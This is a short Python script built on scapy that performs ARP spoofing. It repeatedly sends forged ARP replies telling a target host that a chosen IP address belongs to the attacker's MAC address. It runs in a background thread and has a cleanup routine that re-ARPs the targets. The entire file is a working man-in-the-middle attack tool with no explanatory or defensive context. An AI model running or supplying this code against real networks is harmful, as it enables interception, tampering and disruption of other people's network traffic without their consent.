#!/usr/bin/env python3

from time import sleep

from scapy.all import *
from scapy.layers.l2 import Ether, ARP, getmacbyip

flag = 1


def arp_send(iface, target, spoof_ip, method):
    global flag

    if method == 0:
        deceiver_mac = get_if_hwaddr(iface)
        target_mac = getmacbyip(target)
    elif method == 1:
        deceiver_mac = getmacbyip(target)
        target_mac = get_if_hwaddr(iface)
    else:
        exit()

    while True:
        if flag == 1:
            sendp(
                Ether(dst=target_mac) /
                ARP(op=2, pdst=target, hwdst=target_mac,
                    psrc=spoof_ip, hwsrc=deceiver_mac),
                verbose=False, iface=iface
            )
            print(f'arp reply {spoof_ip} is-at {deceiver_mac}')
            sleep(2)
        else:
            print('Cleaning up and re-arping targets...')
            if method == 0:
                deceiver_mac = getmacbyip(spoof_ip)
            elif method == 1:
                target_mac = getmacbyip(spoof_ip)

            if not deceiver_mac or deceiver_mac == 'ff:ff:ff:ff:ff:ff':
                print('Cleaned')
                exit()

            for i in range(5):
                sendp(
                    Ether(dst=target_mac) /
                    ARP(op=2, pdst=target, hwdst=target_mac,
                        psrc=spoof_ip, hwsrc=deceiver_mac),
                    verbose=False, iface=iface
                )
                print(f'arp reply {spoof_ip} is-at {deceiver_mac}')
                sleep(1)

            flag = 1
            return 0


def arp_spoof(iface, target, spoof_ip, method):
    thread = threading.Thread(target=arp_send, args=(iface, target, spoof_ip, method))
    thread.start()
